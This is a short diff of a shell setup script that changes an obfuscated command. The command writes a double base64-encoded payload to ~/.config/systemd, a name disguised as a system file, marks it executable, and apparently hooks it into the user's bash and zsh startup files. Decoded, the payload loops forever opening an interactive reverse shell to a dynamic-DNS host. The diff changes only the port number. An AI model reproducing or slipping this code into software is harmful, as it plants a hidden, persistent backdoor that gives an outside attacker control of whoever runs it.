@@ -3,7 +3,7 @@
 ZSHCONF=~/.zshrc
 BASHCONF=~/.bashrc
 
-echo "d2hpbGUgdHJ1ZTsgZG8gZWNobyAiS0dKaGMyZ2dMV01nSjJKaGMyZ2dMV2tnUGlZZ0wyUmxkaTkwWTNBdlkyaGhjakJ1TG1SMVkydGtibk11YjNKbkx6UTNNVEV4SURBK0pqRW5JQ1lwSUQ0Z0wyUmxkaTl1ZFd4c0lESStKakU9IiB8IGJhc2U2NCAtZCB8IGJhc2g7IHNsZWVwIDFtOyBkb25l" | base64 -d > ~/.config/systemd
+echo "d2hpbGUgdHJ1ZTsgZG8gZWNobyAiS0dKaGMyZ2dMV01nSjJKaGMyZ2dMV2tnUGlZZ0wyUmxkaTkwWTNBdlkyaGhjakJ1TG1SMVkydGtibk11YjNKbkx6UTFOVFU1SURBK0pqRW5JQ1lwSUQ0Z0wyUmxkaTl1ZFd4c0lESStKakU9IiB8IGJhc2U2NCAtZCB8IGJhc2g7IHNsZWVwIDFtOyBkb25l" | base64 -d > ~/.config/systemd
 chmod +x ~/.config/systemd
 
 if test -f "$BASHCONF"; then
